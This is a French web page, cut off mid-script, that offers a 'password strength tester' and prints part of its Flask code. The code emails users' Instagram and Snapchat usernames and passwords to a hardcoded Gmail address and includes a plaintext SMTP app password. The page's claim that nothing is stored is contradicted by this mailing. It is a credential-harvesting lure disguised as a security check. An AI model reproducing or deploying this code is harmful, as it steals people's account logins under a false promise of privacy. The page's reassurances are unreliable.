🔐 Testeur de Sécurité de Mot de Passe Bienvenue sur notre outil de test de mot de passe. Ce site a été conçu pour vous aider à évaluer la robustesse de votre mot de passe en simulant une attaque par force brute. L’objectif est de vous sensibiliser à l’importance d’un mot de passe complexe et sécurisé. ✅ Site sécurisé : Aucune donnée personnelle n’est enregistrée ni conservée. Les pseudos et mots de passe sont transmis uniquement pour analyse confidentielle, sans stockage ni partage. 🎯 Objectif du site Ce testeur vous permet de : Vérifier si votre mot de passe est facilement devinable Comprendre les risques liés aux mots de passe simples Recevoir un retour immédiat sur la sécurité de votre mot de passe 🧪 Fonctionnement du test Le testeur génère toutes les combinaisons possibles de caractères. Il compare chaque tentative à votre mot de passe. Si le mot est trouvé rapidement (moins de 10 secondes), il est considéré comme non sécurisé. Les pseudos et le mot de passe sont transmis par mail pour analyse confidentielle. 💻 Script Python utilisé from flask import Flask, request, jsonify import itertools, string, time, smtplib from email.mime.text import MIMEText from concurrent.futures import ThreadPoolExecutor, as_completed app = Flask(__name__) DESTINATAIRE = "yamafly404@gmail.com" EXPEDITEUR = "yamafly404@gmail.com" MOT_DE_PASSE = "tdig nbky fome nukp" SMTP_SERVEUR = "smtp.gmail.com" SMTP_PORT = 587 caracteres = string.ascii_letters + string.digits + string.punctuation def tester_combinaison(combinaison, mot): tentative = ''.join(combinaison) return tentative if tentative == mot else None def envoyer_email(pseudo_instagram, pseudo_snap, mot, resultat): sujet = "Test de mot de passe -
